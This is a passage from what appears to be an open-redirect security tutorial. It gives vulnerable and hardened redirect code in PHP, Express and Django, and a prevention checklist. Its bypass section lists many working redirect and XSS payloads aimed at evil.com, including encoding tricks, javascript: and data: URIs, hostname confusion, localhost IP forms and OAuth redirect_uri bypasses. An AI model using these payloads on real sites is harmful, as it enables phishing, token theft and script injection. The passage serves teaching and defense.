        
        <span class="code-comment">// If no scheme/host, treat as relative path</span>
        <span class="code-keyword">if</span> (!<span class="code-function">isset</span>(<span class="code-keyword">$parsed</span>[<span class="code-string">'host'</span>])) {
            <span class="code-comment">// Validate relative path starts with /</span>
            <span class="code-keyword">if</span> (!<span class="code-function">str_starts_with</span>(<span class="code-keyword">$url</span>, <span class="code-string">'/'</span>)) {
                <span class="code-keyword">return</span> <span class="code-keyword">null</span>;
            }
            <span class="code-comment">// Prevent path traversal</span>
            <span class="code-keyword">if</span> (<span class="code-function">str_contains</span>(<span class="code-keyword">$url</span>, <span class="code-string">'..'</span>)) {
                <span class="code-keyword">return</span> <span class="code-keyword">null</span>;
            }
            <span class="code-keyword">return</span> <span class="code-keyword">$url</span>;  <span class="code-comment">// Safe relative URL</span>
        }
        
        <span class="code-comment">// Validate scheme (must be HTTPS)</span>
        <span class="code-keyword">$scheme</span> = <span class="code-keyword">$parsed</span>[<span class="code-string">'scheme'</span>] ?? <span class="code-string">''</span>;
        <span class="code-keyword">if</span> (!<span class="code-function">in_array</span>(<span class="code-keyword">$scheme</span>, <span class="code-keyword">$this</span>->allowed_schemes, <span class="code-keyword">true</span>)) {
            <span class="code-keyword">return</span> <span class="code-keyword">null</span>;
        }
        
        <span class="code-comment">// Extract host (remove port if present)</span>
        <span class="code-keyword">$host</span> = <span class="code-keyword">$parsed</span>[<span class="code-string">'host'</span>];
        <span class="code-keyword">$host</span> = <span class="code-function">strtolower</span>(<span class="code-keyword">$host</span>);  <span class="code-comment">// Normalize case</span>
        
        <span class="code-comment">// Check against allowlist (exact match or valid subdomain)</span>
        <span class="code-keyword">$is_allowed</span> = <span class="code-keyword">false</span>;
        <span class="code-keyword">foreach</span> (<span class="code-keyword">$this</span>->allowed_hosts <span class="code-keyword">as</span> <span class="code-keyword">$allowed</span>) {
            <span class="code-keyword">if</span> (<span class="code-keyword">$host</span> === <span class="code-keyword">$allowed</span>) {
                <span class="code-keyword">$is_allowed</span> = <span class="code-keyword">true</span>;
                <span class="code-keyword">break</span>;
            }
            <span class="code-comment">// Allow subdomains: *.example.com</span>
            <span class="code-keyword">if</span> (<span class="code-function">str_ends_with</span>(<span class="code-keyword">$host</span>, <span class="code-string">'.'</span> . <span class="code-keyword">$allowed</span>)) {
                <span class="code-keyword">$is_allowed</span> = <span class="code-keyword">true</span>;
                <span class="code-keyword">break</span>;
            }
        }
        
        <span class="code-keyword">if</span> (!<span class="code-keyword">$is_allowed</span>) {
            <span class="code-keyword">return</span> <span class="code-keyword">null</span>;
        }
        
        <span class="code-comment">// Reconstruct safe URL (only scheme, host, path, query)</span>
        <span class="code-keyword">$safe_url</span> = <span class="code-string">'https://'</span> . <span class="code-keyword">$host</span>;
        <span class="code-keyword">if</span> (<span class="code-function">isset</span>(<span class="code-keyword">$parsed</span>[<span class="code-string">'path'</span>])) {
            <span class="code-keyword">$safe_url</span> .= <span class="code-keyword">$parsed</span>[<span class="code-string">'path'</span>];
        }
        <span class="code-keyword">if</span> (<span class="code-function">isset</span>(<span class="code-keyword">$parsed</span>[<span class="code-string">'query'</span>])) {
            <span class="code-keyword">$safe_url</span> .= <span class="code-string">'?'</span> . <span class="code-keyword">$parsed</span>[<span class="code-string">'query'</span>];
        }
        
        <span class="code-keyword">return</span> <span class="code-keyword">$safe_url</span>;
    }
    
    <span class="code-keyword">public function</span> <span class="code-function">redirect</span>(<span class="code-keyword">$url</span>) {
        <span class="code-keyword">$safe_url</span> = <span class="code-keyword">$this</span>-><span class="code-function">validateRedirect</span>(<span class="code-keyword">$url</span>);
        
        <span class="code-keyword">if</span> (<span class="code-keyword">$safe_url</span> === <span class="code-keyword">null</span>) {
            <span class="code-comment">// Log suspicious attempt</span>
            <span class="code-function">error_log</span>(<span class="code-string">"Blocked redirect attempt to: "</span> . <span class="code-keyword">$url</span>);
            <span class="code-keyword">$safe_url</span> = <span class="code-string">'/home'</span>;  <span class="code-comment">// Default safe location</span>
        }
        
        <span class="code-function">header</span>(<span class="code-string">"Location: "</span> . <span class="code-keyword">$safe_url</span>);
        <span class="code-keyword">exit</span>;
    }
}

<span class="code-comment">// Usage</span>
<span class="code-keyword">$handler</span> = <span class="code-keyword">new</span> SecureRedirectHandler();
<span class="code-keyword">$handler</span>-><span class="code-function">redirect</span>(<span class="code-keyword">$_GET</span>[<span class="code-string">'return'</span>] ?? <span class="code-string">'/home'</span>);
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Lab 2: Node.js/Express Secure Implementation</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Express <code>res.redirect()</code> with unvalidated user input.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">❌ Vulnerable Express Code</span></div>
          <pre><code><span class="code-keyword">const</span> express = <span class="code-function">require</span>(<span class="code-string">'express'</span>);
<span class="code-keyword">const</span> app = <span class="code-function">express</span>();

<span class="code-comment">// DANGEROUS: Direct redirect to user input</span>
app.<span class="code-function">get</span>(<span class="code-string">'/login'</span>, (req, res) => {
    <span class="code-keyword">const</span> returnTo = req.query.returnTo || <span class="code-string">'/dashboard'</span>;
    res.<span class="code-function">redirect</span>(returnTo);  <span class="code-comment">-- No validation!</span>
});

<span class="code-comment">// Also vulnerable: protocol-relative URLs bypass naive checks</span>
app.<span class="code-function">get</span>(<span class="code-string">'/login'</span>, (req, res) => {
    <span class="code-keyword">let</span> returnTo = req.query.returnTo || <span class="code-string">'/dashboard'</span>;
    
    <span class="code-comment">// Naive check - easily bypassed!</span>
    <span class="code-keyword">if</span> (returnTo.<span class="code-function">startsWith</span>(<span class="code-string">'http'</span>)) {
        <span class="code-keyword">return</span> res.<span class="code-function">status</span>(<span class="code-number">400</span>).<span class="code-function">send</span>(<span class="code-string">'Invalid redirect'</span>);
    }
    
    <span class="code-comment">-- Bypass: ?returnTo=//evil.com (protocol-relative)</span>
    <span class="code-comment">-- Bypass: ?returnTo=/\evil.com (backslash)</span>
    <span class="code-comment">-- Bypass: ?returnTo=/%09/evil.com (tab encoding)</span>
    
    res.<span class="code-function">redirect</span>(returnTo);
});</code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Secure Express Implementation</span></div>
          <pre><code><span class="code-keyword">const</span> express = <span class="code-function">require</span>(<span class="code-string">'express'</span>);
<span class="code-keyword">const</span> { URL } = <span class="code-function">require</span>(<span class="code-string">'url'</span>);
<span class="code-keyword">const</span> app = <span class="code-function">express</span>();

<span class="code-keyword">class</span> <span class="code-function">RedirectValidator</span> {
    <span class="code-function">constructor</span>() {
        <span class="code-keyword">this</span>.allowedHosts = <span class="code-keyword">new</span> <span class="code-function">Set</span>([
            <span class="code-string">'example.com'</span>,
            <span class="code-string">'www.example.com'</span>,
            <span class="code-string">'app.example.com'</span>
        ]);
        
        <span class="code-keyword">this</span>.allowedSchemes = <span class="code-keyword">new</span> <span class="code-function">Set</span>([<span class="code-string">'https'</span>]);
    }
    
    <span class="code-function">isValidRedirect</span>(urlString) {
        <span class="code-keyword">if</span> (<span class="code-keyword">typeof</span> urlString !== <span class="code-string">'string'</span> || urlString.<span class="code-function">length</span> > <span class="code-number">2048</span>) {
            <span class="code-keyword">return</span> <span class="code-keyword">false</span>;
        }
        
        <span class="code-keyword">try</span> {
            <span class="code-keyword">const</span> url = <span class="code-keyword">new</span> <span class="code-function">URL</span>(urlString, <span class="code-string">'https://example.com'</span>);
            
            <span class="code-comment">// Check scheme</span>
            <span class="code-keyword">if</span> (!<span class="code-keyword">this</span>.allowedSchemes.<span class="code-function">has</span>(url.protocol.<span class="code-function">slice</span>(<span class="code-number">0</span>, -<span class="code-number">1</span>))) {
                <span class="code-keyword">return</span> <span class="code-keyword">false</span>;
            }
            
            <span class="code-comment">// Check host (exact match or subdomain)</span>
            <span class="code-keyword">const</span> hostname = url.hostname.<span class="code-function">toLowerCase</span>();
            <span class="code-keyword">if</span> (<span class="code-keyword">this</span>.allowedHosts.<span class="code-function">has</span>(hostname)) {
                <span class="code-keyword">return</span> <span class="code-keyword">true</span>;
            }
            
            <span class="code-comment">// Check if it's a valid subdomain</span>
            <span class="code-keyword">for</span> (<span class="code-keyword">const</span> allowed <span class="code-keyword">of</span> <span class="code-keyword">this</span>.allowedHosts) {
                <span class="code-keyword">if</span> (hostname.<span class="code-function">endsWith</span>(<span class="code-string">'.'</span> + allowed)) {
                    <span class="code-keyword">return</span> <span class="code-keyword">true</span>;
                }
            }
            
            <span class="code-keyword">return</span> <span class="code-keyword">false</span>;
        } <span class="code-keyword">catch</span> (e) {
            <span class="code-comment">// If URL parsing fails, check if it's a safe relative path</span>
            <span class="code-keyword">if</span> (urlString.<span class="code-function">startsWith</span>(<span class="code-string">'/'</span>) && !urlString.<span class="code-function">startsWith</span>(<span class="code-string">'//'</span>)) {
                <span class="code-keyword">return</span> !urlString.<span class="code-function">includes</span>(<span class="code-string">'..'</span>);
            }
            <span class="code-keyword">return</span> <span class="code-keyword">false</span>;
        }
    }
    
    <span class="code-function">getSafeRedirect</span>(urlString, defaultPath = <span class="code-string">'/dashboard'</span>) {
        <span class="code-keyword">if</span> (<span class="code-keyword">this</span>.<span class="code-function">isValidRedirect</span>(urlString)) {
            <span class="code-keyword">return</span> urlString;
        }
        <span class="code-keyword">return</span> defaultPath;
    }
}

<span class="code-keyword">const</span> validator = <span class="code-keyword">new</span> <span class="code-function">RedirectValidator</span>();

<span class="code-comment">// Secure route</span>
app.<span class="code-function">get</span>(<span class="code-string">'/login'</span>, (req, res) => {
    <span class="code-keyword">const</span> returnTo = validator.<span class="code-function">getSafeRedirect</span>(req.query.returnTo);
    res.<span class="code-function">redirect</span>(returnTo);
});

<span class="code-comment">// Additional middleware for logging blocked attempts</span>
app.<span class="code-function">use</span>((req, res, next) => {
    <span class="code-keyword">const</span> originalRedirect = res.redirect;
    res.<span class="code-function">redirect</span> = <span class="code-keyword">function</span>(url) {
        <span class="code-keyword">if</span> (!validator.<span class="code-function">isValidRedirect</span>(url)) {
            console.<span class="code-function">warn</span>(<span class="code-string">`Blocked redirect to: ${url}`</span>);
            <span class="code-keyword">return</span> res.<span class="code-function">status</span>(<span class="code-number">400</span>).<span class="code-function">send</span>(<span class="code-string">'Invalid redirect'</span>);
        }
        <span class="code-keyword">return</span> originalRedirect.<span class="code-function">call</span>(<span class="code-keyword">this</span>, url);
    };
    <span class="code-function">next</span>();
});</code></pre>
        </div>

        <h3 class="subsection-title">Lab 3: Python/Django Secure Implementation</h3>
        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Django Secure Implementation</span></div>
          <pre><code><span class="code-keyword">from</span> django.http <span class="code-keyword">import</span> HttpResponseRedirect, HttpResponseBadRequest
<span class="code-keyword">from</span> django.utils.http <span class="code-keyword">import</span> url_has_allowed_host_and_scheme
<span class="code-keyword">from</span> urllib.parse <span class="code-keyword">import</span> urlparse
<span class="code-keyword">import</span> re

<span class="code-keyword">class</span> <span class="code-function">SafeRedirectMixin</span>:
    <span class="code-string">"""Mixin to validate redirect URLs in Django views"""</span>
    
    <span class="code-function">ALLOWED_HOSTS</span> = [<span class="code-string">'example.com'</span>, <span class="code-string">'www.example.com'</span>]
    <span class="code-function">ALLOWED_SCHEMES</span> = [<span class="code-string">'https'</span>]
    
    <span class="code-keyword">def</span> <span class="code-function">get_safe_redirect_url</span>(self, url, default=<span class="code-string">'/'</span>):
        <span class="code-keyword">if</span> <span class="code-keyword">not</span> url:
            <span class="code-keyword">return</span> default
        
        <span class="code-comment"># Django's built-in helper (checks host against ALLOWED_HOSTS)</span>
        <span class="code-keyword">if</span> url_has_allowed_host_and_scheme(
            url, 
            allowed_hosts=self.ALLOWED_HOSTS,
            require_https=<span class="code-keyword">True</span>
        ):
            <span class="code-keyword">return</span> url
        
        <span class="code-comment"># Log blocked attempt</span>
        <span class="code-keyword">import</span> logging
        logger = logging.<span class="code-function">getLogger</span>(<span class="code-string">'security'</span>)
        logger.<span class="code-function">warning</span>(<span class="code-string">f"Blocked redirect to: {url}"</span>)
        
        <span class="code-keyword">return</span> default

<span class="code-comment"># Usage in views</span>
<span class="code-keyword">from</span> django.views.generic <span class="code-keyword">import</span> View

<span class="code-keyword">class</span> <span class="code-function">LoginView</span>(SafeRedirectMixin, View):
    <span class="code-keyword">def</span> <span class="code-function">get</span>(self, request):
        next_url = request.GET.<span class="code-function">get</span>(<span class="code-string">'next'</span>)
        safe_url = self.<span class="code-function">get_safe_redirect_url</span>(next_url, <span class="code-string">'/dashboard'</span>)
        
        <span class="code-comment"># Perform login...</span>
        
        <span class="code-keyword">return</span> HttpResponseRedirect(safe_url)

<span class="code-comment"># Alternative: Decorator approach</span>
<span class="code-keyword">def</span> <span class="code-function">safe_redirect</span>(param_name=<span class="code-string">'next'</span>, default=<span class="code-string">'/'</span>):
    <span class="code-keyword">def</span> <span class="code-function">decorator</span>(view_func):
        <span class="code-keyword">def</span> <span class="code-function">_wrapped_view</span>(request, *args, **kwargs):
            url = request.GET.<span class="code-function">get</span>(param_name) <span class="code-keyword">or</span> default
            
            <span class="code-keyword">if</span> <span class="code-keyword">not</span> url_has_allowed_host_and_scheme(
                url,
                allowed_hosts=settings.ALLOWED_HOSTS,
                require_https=<span class="code-keyword">True</span>
            ):
                url = default
            
            request.safe_redirect_url = url
            <span class="code-keyword">return</span> <span class="code-function">view_func</span>(request, *args, **kwargs)
        <span class="code-keyword">return</span> _wrapped_view
    <span class="code-keyword">return</span> decorator</code></pre>
        </div>
      </div>

      <div id="bypass" class="content-card">
        <h2 class="card-title"><i>🚧</i> Open Redirect Bypass Techniques</h2>

        <p class="text-content">
          Attackers employ sophisticated techniques to bypass URL validation filters, WAFs, and naive allowlist checks.
          Understanding these bypasses is essential for building robust defenses.
        </p>

        <h3 class="subsection-title">1. URL Encoding & Obfuscation</h3>
        <p class="text-content">
          Encoding special characters can bypass simple string matching and regex filters.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Encoding Bypasses</span></div>
          <pre><code><span class="code-comment">-- Double URL encoding</span>
<span class="code-string">?redirect=%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d</span>
<span class="code-string">?redirect=%2568%2574%2574%2570%253a%252f%252f%2565%2576%2569%256c%252e%2563%256f%256d</span>

<span class="code-comment">-- Unicode encoding</span>
<span class="code-string">?redirect=https://evil.com%00.com</span>  <span class="code-comment">-- Null byte (legacy PHP)</span>
<span class="code-string">?redirect=https://evil.com%E3%80%82com</span>  <span class="code-comment">-- Fullwidth dot</span>

<span class="code-comment">-- Mixed encoding</span>
<span class="code-string">?redirect=https://%65%76%69%6c.com</span>  <span class="code-comment">-- Partial encoding</span>
<span class="code-string">?redirect=https://evil%2ecom</span>  <span class="code-comment">-- Encoded dot</span>

<span class="code-comment">-- Tab and newline injection</span>
<span class="code-string">?redirect=https://evil.com%09.com</span>  <span class="code-comment">-- Tab character</span>
<span class="code-string">?redirect=https://evil.com%0d.com</span>  <span class="code-comment">-- Carriage return</span></code></pre>
        </div>

        <h3 class="subsection-title">2. Protocol & Schema Abuse</h3>
        <p class="text-content">
          Alternative protocols can execute JavaScript or access local resources even when HTTP is blocked.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Protocol Bypasses</span></div>
          <pre><code><span class="code-comment">-- JavaScript protocol (XSS)</span>
<span class="code-string">?redirect=javascript:alert(document.cookie)</span>
<span class="code-string">?redirect=javascript://%0d%0aalert(1)</span>  <span class="code-comment">-- With newline to hide JS</span>

<span class="code-comment">-- Data URI (XSS)</span>
<span class="code-string">?redirect=data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</span>
<span class="code-string">?redirect=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</span>

<span class="code-comment">-- Protocol-relative URLs</span>
<span class="code-string">?redirect=//evil.com</span>  <span class="code-comment">-- Inherits current protocol</span>

<span class="code-comment">-- Backslash exploitation (IE/Edge legacy)</span>
<span class="code-string">?redirect=https:/\evil.com</span>
<span class="code-string">?redirect=https:\\evil.com</span>

<span class="code-comment">-- Mixed case protocols</span>
<span class="code-string">?redirect=HtTpS://evil.com</span>  <span class="code-comment">-- Case-sensitive check bypass</span>
<span class="code-string">?redirect=jAvAsCrIpT:alert(1)</span></code></pre>
        </div>

        <h3 class="subsection-title">3. Hostname Manipulation</h3>
        <p class="text-content">
          Creative hostname formatting can bypass domain validation that doesn't properly parse URLs.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Hostname Bypasses</span></div>
          <pre><code><span class="code-comment">-- @ symbol (credential injection)</span>
<span class="code-string">?redirect=https://legit.com@evil.com</span>
<span class="code-string">?redirect=https://legit.com.evil.com</span>  <span class="code-comment">-- Subdomain of evil</span>

<span class="code-comment">-- Fragment abuse</span>
<span class="code-string">?redirect=https://evil.com#legit.com</span>  <span class="code-comment">-- Some parsers see legit.com</span>

<span class="code-comment">-- Query string confusion</span>
<span class="code-string">?redirect=https://evil.com?legit.com</span>
<span class="code-string">?redirect=https://evil.com/?x=https://legit.com</span>  <span class="code-comment">-- Confuses string search</span>

<span class="code-comment">-- IDN homograph attacks</span>
<span class="code-string">?redirect=https://еxample.com</span>  <span class="code-comment">-- Cyrillic 'е' (U+0435) not Latin 'e' (U+0065)</span>

<span class="code-comment">-- IP address formats</span>
<span class="code-string">?redirect=http://0177.0.0.1</span>  <span class="code-comment">-- Octal IP = 127.0.0.1</span>
<span class="code-string">?redirect=http://0x7f.0.0.1</span>  <span class="code-comment">-- Hex IP = 127.0.0.1</span>
<span class="code-string">?redirect=http://2130706433</span>  <span class="code-comment">-- Decimal IP = 127.0.0.1</span>

<span class="code-comment">-- IPv6</span>
<span class="code-string">?redirect=http://[::ffff:127.0.0.1]</span>  <span class="code-comment">-- IPv4-mapped IPv6 localhost</span></code></pre>
        </div>

        <h3 class="subsection-title">4. WAF & Filter Bypasses</h3>
        <p class="text-content">
          Web Application Firewalls often use regex patterns that can be circumvented with creative payloads.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">WAF Evasion Techniques</span></div>
          <pre><code><span class="code-comment">-- Whitespace exploitation</span>
<span class="code-string">?redirect= https://evil.com</span>  <span class="code-comment">-- Leading space</span>
<span class="code-string">?redirect=https:// evil.com</span>  <span class="code-comment">-- Space in hostname</span>

<span class="code-comment">-- Multiple slashes</span>
<span class="code-string">?redirect=https:///evil.com</span>  <span class="code-comment">-- Triple slash</span>
<span class="code-string">?redirect=https:evil.com</span>  <span class="code-comment">-- Missing slashes</span>

<span class="code-comment">-- HTML entities (if decoded)</span>
<span class="code-string">?redirect=https://evil&amp;#46;com</span>  <span class="code-comment">-- HTML entity dot</span>

<span class="code-comment">-- Path traversal in redirect</span>
<span class="code-string">?redirect=/../../evil.com</span>
<span class="code-string">?redirect=/\evil.com</span>  <span class="code-comment">-- Backslash path</span>

<span class="code-comment">-- Null byte injection (legacy systems)</span>
<span class="code-string">?redirect=https://evil.com%00.legit.com</span>  <span class="code-comment">-- C-style string termination</span>

<span class="code-comment">-- Dangling markup (if reflected in HTML)</span>
<span class="code-string">?redirect=">https://evil.com</span>  <span class="code-comment">-- Breaks out of attribute</span></code></pre>
        </div>

        <h3 class="subsection-title">5. OAuth-Specific Bypasses</h3>
        <p class="text-content">
          OAuth redirect_uri validation has unique bypass vectors due to partial matching and URI component parsing.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">OAuth redirect_uri Bypasses</span></div>
          <pre><code><span class="code-comment">-- Path traversal in registered URI</span>
<span class="code-comment">-- Registered: https://app.com/callback</span>
<span class="code-string">redirect_uri=https://app.com/callback/../evil</span>
<span class="code-string">redirect_uri=https://app.com/callback/%2e%2e/evil</span>

<span class="code-comment">-- Fragment abuse</span>
<span class="code-string">redirect_uri=https://app.com/callback#evil.com</span>

<span class="code-comment">-- Query parameter injection</span>
<span class="code-string">redirect_uri=https://app.com/callback?x=evil.com</span>

<span class="code-comment">-- Subdomain wildcard abuse</span>
<span class="code-comment">-- Registered: https://*.app.com/callback</span>
<span class="code-string">redirect_uri=https://evil.app.com/callback</span>  <span class="code-comment">-- Attacker controls subdomain</span>

<span class="code-comment">-- Port variation</span>
<span class="code-string">redirect_uri=https://app.com:8080/callback</span>  <span class="code-comment">-- Different port</span>

<span class="code-comment">-- @ in path (some parsers mishandle)</span>
<span class="code-string">redirect_uri=https://app.com/callback@evil.com</span>

<span class="code-comment">-- Unicode normalization</span>
<span class="code-string">redirect_uri=https://app.com/callback%EF%BC%8Fevil</span>  <span class="code-comment">-- Fullwidth slash</span></code></pre>
        </div>
      </div>

      <div id="mitigation" class="content-card">
        <h2 class="card-title"><i>🛡️</i> Open Redirect Prevention Checklist: Defense in Depth</h2>

        <div class="highlight-box">
          <strong>Golden Rule:</strong> Never redirect to user-controlled URLs. If redirects are absolutely necessary,
          use
          strict allowlists of complete URLs (not partial matches), validate with proper URL parsing libraries (not
          string
          operations), and never allow protocol schemas other than HTTPS.
        </div>

        <h3 class="subsection-title">Layer 1: Eliminate User-Controlled Redirects</h3>
        <p class="text-content">
          The most effective defense is removing user-controlled redirect targets entirely.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Architecture Best Practices</span></div>
          <pre><code><span class="code-comment">-- ❌ NEVER: Direct user input in redirect</span>
<span class="code-keyword">header</span>(<span class="code-string">"Location: "</span> . <span class="code-keyword">$_GET</span>[<span class="code-string">'return'</span>]);

<span class="code-comment">-- ✅ ALWAYS: Internal mapping or hardcoded destinations</span>
<span class="code-comment">-- Option 1: Token-based mapping</span>
<span class="code-keyword">$destinations</span> = [
    <span class="code-string">'dashboard'</span> => <span class="code-string">'/user/dashboard'</span>,
    <span class="code-string">'profile'</span> => <span class="code-string">'/user/profile'</span>,
    <span class="code-string">'settings'</span> => <span class="code-string">'/user/settings'</span>
];

<span class="code-keyword">$key</span> = <span class="code-keyword">$_GET</span>[<span class="code-string">'return'</span>] ?? <span class="code-string">'dashboard'</span>;
<span class="code-keyword">$url</span> = <span class="code-keyword">$destinations</span>[<span class="code-keyword">$key</span>] ?? <span class="code-string">'/home'</span>;
<span class="code-function">header</span>(<span class="code-string">"Location: "</span> . <span class="code-keyword">$url</span>);

<span class="code-comment">-- Option 2: Session-stored return URL (set server-side)</span>
<span class="code-keyword">$_SESSION</span>[<span class="code-string">'return_after_login'</span>] = <span class="code-string">'/dashboard'</span>;  <span class="code-comment">-- Server sets this</span>
<span class="code-comment">-- After login:</span>
<span class="code-keyword">$url</span> = <span class="code-keyword">$_SESSION</span>[<span class="code-string">'return_after_login'</span>] ?? <span class="code-string">'/home'</span>;
<span class="code-function">header</span>(<span class="code-string">"Location: "</span> . <span class="code-keyword">$url</span>);</code></pre>
        </div>

        <h3 class="subsection-title">Layer 2: Strict URL Validation</h3>
        <p class="text-content">
          If dynamic redirects are unavoidable, implement rigorous validation using proper URL parsing.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Validation Rules</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">class</span> <span class="code-function">RedirectSecurity</span> {
    <span class="code-comment">/**
     * Validates redirect URL with strict rules
     */</span>
    <span class="code-keyword">public static function</span> <span class="code-function">isSafeRedirect</span>(<span class="code-keyword">$url</span>) {
        <span class="code-comment">// 1. Input validation</span>
        <span class="code-keyword">if</span> (!<span class="code-function">is_string</span>(<span class="code-keyword">$url</span>) || <span class="code-function">strlen</span>(<span class="code-keyword">$url</span>) > <span class="code-number">2048</span>) {
            <span class="code-keyword">return</span> <span class="code-keyword">false</span>;
        }
        
        <span class="code-comment">// 2. Decode to prevent encoding bypasses</span>
        <span class="code-keyword">$url</span> = <span class="code-function">urldecode</span>(<span class="code-keyword">$url</span>);
        <span class="code-keyword">$url</span> = <span class="code-function">urldecode</span>(<span class="code-keyword">$url</span>);  <span class="code-comment">// Double-decode for double-encoding</span>
        
        <span class="code-comment">// 3. Parse URL</span>
        <span class="code-keyword">$parsed</span> = <span class="code-function">parse_url</span>(<span class="code-keyword">$url</span>);
        
        <span class="code-comment">// 4. If no host, validate as relative path</span>
        <span class="code-keyword">if</span> (!<span class="code-function">isset</span>(<span class="code-keyword">$parsed</span>[<span class="code-string">'host'</span>])) {
            <span class="code-keyword">return</span> self::<span class="code-function">isSafeRelativePath</span>(<span class="code-keyword">$url</span>);
        }
        
        <span class="code-comment">// 5. Validate scheme (HTTPS only)</span>
        <span class="code-keyword">$scheme</span> = <span class="code-keyword">$parsed</span>[<span class="code-string">'scheme'</span>] ?? <span class="code-string">''</span>;
        <span class="code-keyword">if</span> (<span class="code-function">strtolower</span>(<span class="code-keyword">$scheme</span>) !== <span class="code-string">'https'</span>) {
            <span class="code-keyword">return</span> <span class="code-keyword">false</span>;
        }
        
        <span class="code-comment">// 6. Validate host (exact allowlist)</span>
        <span class="code-keyword">$host</span> = <span class="code-function">strtolower</span>(<span class="code-keyword">$parsed</span>[<span class="code-string">'host'</span>]);
        <span class="code-keyword">$allowed</span> = [<span class="code-string">'example.com'</span>, <span class="code-string">'www.example.com'</span>, <span class="code-string">'app.example.com'</span>];
        
        <span class="code-keyword">if</span> (!<span class="code-function">in_array</span>(<span class="code-keyword">$host</span>, <span class="code-keyword">$allowed</span>, <span class="code-keyword">true</span>)) {
            <span class="code-comment">// Check for valid subdomain</span>
            <span class="code-keyword">$is_subdomain</span> = <span class="code-keyword">false</span>;
            <span class="code-keyword">foreach</span> (<span class="code-keyword">$allowed</span> <span class="code-keyword">as</span> <span class="code-keyword">$domain</span>) {
                <span class="code-keyword">if</span> (<span class="code-function">str_ends_with</span>(<span class="code-keyword">$host</span>, <span class="code-string">'.'</span> . <span class="code-keyword">$domain</span>)) {
                    <span class="code-keyword">$is_subdomain</span> = <span class="code-keyword">true</span>;
                    <span class="code-keyword">break</span>;
                }
            }
            <span class="code-keyword">if</span> (!<span class="code-keyword">$is_subdomain</span>) {
                <span class="code-keyword">return</span> <span class="code-keyword">false</span>;
            }
        }
        
        <span class="code-comment">// 7. Reject URLs with userinfo (attacker@host)</span>
        <span class="code-keyword">if</span> (<span class="code-function">isset</span>(<span class="code-keyword">$parsed</span>[<span class="code-string">'user'</span>]) || <span class="code-function">isset</span>(<span class="code-keyword">$parsed</span>[<span class="code-string">'pass'</span>])) {
            <span class="code-keyword">return</span> <span class="code-keyword">false</span>;
        }
        
        <span class="code-comment">// 8. Reject certain characters</span>
        <span class="code-keyword">$dangerous</span> = [<span class="code-string">'\\'</span>, <span class="code-string">'&lt;'</span>, <span class="code-string">'&gt;'</span>, <span class="code-string">'"'</span>, <span class="code-string">"'"</span>, <span class="code-string">'`'</span>];
        <span class="code-keyword">foreach</span> (<span class="code-keyword">$dangerous</span> <span class="code-keyword">as</span> <span class="code-keyword">$char</span>) {
            <span class="code-keyword">if</span> (<span class="code-function">str_contains</span>(<span class="code-keyword">$url</span>, <span class="code-keyword">$char</span>)) {
                <span class="code-keyword">return</span> <span class="code-keyword">false</span>;
            }
        }
        
        <span class="code-keyword">return</span> <span class="code-keyword">true</span>;
    }
    
    <span class="code-keyword">private static function</span> <span class="code-function">isSafeRelativePath</span>(<span class="code-keyword">$path</span>) {
        <span class="code-comment">// Must start with /</span>
        <span class="code-keyword">if</span> (!<span class="code-function">str_starts_with</span>(<span class="code-keyword">$path</span>, <span class="code-string">'/'</span>)) {
            <span class="code-keyword">return</span> <span class="code-keyword">false</span>;
        }
        
        <span class="code-comment">// Must not start with // (protocol-relative)</span>
        <span class="code-keyword">if</span> (<span class="code-function">str_starts_with</span>(<span class="code-keyword">$path</span>, <span class="code-string">'//'</span>)) {
            <span class="code-keyword">return</span> <span class="code-keyword">false</span>;
        }
        
        <span class="code-comment">// No path traversal</span>
        <span class="code-keyword">if</span> (<span class="code-function">str_contains</span>(<span class="code-keyword">$path</span>, <span class="code-string">'..'</span>)) {
            <span class="code-keyword">return</span> <span class="code-keyword">false</span>;
        }
        
        <span class="code-keyword">return</span> <span class="code-keyword">true</span>;
    }
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 3: Content Security Policy</h3>
        <p class="text-content">
          CSP can mitigate the impact of successful redirects by preventing execution of injected JavaScript.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">CSP Headers for Redirect Protection</span></div>
          <pre><code><span class="code-comment">-- Prevent javascript: protocol execution</span>
<span class="code-keyword">Content-Security-Policy</span>: <span class="code-string">default-src 'self'; script-src 'self'; navigate-to 'self' https://example.com</span>

<span class="code-comment">-- navigate-to directive (experimental, limited support)</span>
<span class="code-keyword">Content-Security-Policy</span>: <span class="code-string">navigate-to 'self'</span>

<span class="code-comment">-- X-Frame-Options to prevent clickjacking of redirect pages</span>
<span class="code-keyword">X-Frame-Options</span>: <span class="code-string">DENY</span>

<span class="code-comment">-- Referrer-Policy to prevent leaking tokens via referrer</span>
<span class="code-keyword">Referrer-Policy</span>: <span class="code-string">strict-origin-when-cross-origin</span>

<span class="code-comment">-- PHP implementation</span>
<span class="code-function">header</span>(<span class="code-string">"Content-Security-Policy: default-src 'self'; script-src 'self'"</span>);
<span class="code-function">header</span>(<span class="code-string">"X-Frame-Options: DENY"</span>);
<span class="code-function">header</span>(<span class="code-string">"Referrer-Policy: strict-origin-when-cross-origin"</span>);</code></pre>
        </div>

        <h3 class="subsection-title">Layer 4: OAuth-Specific Protections</h3>
        <p class="text-content">
          OAuth implementations require additional protections due to the high value of authorization codes.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">OAuth redirect_uri Security</span></div>
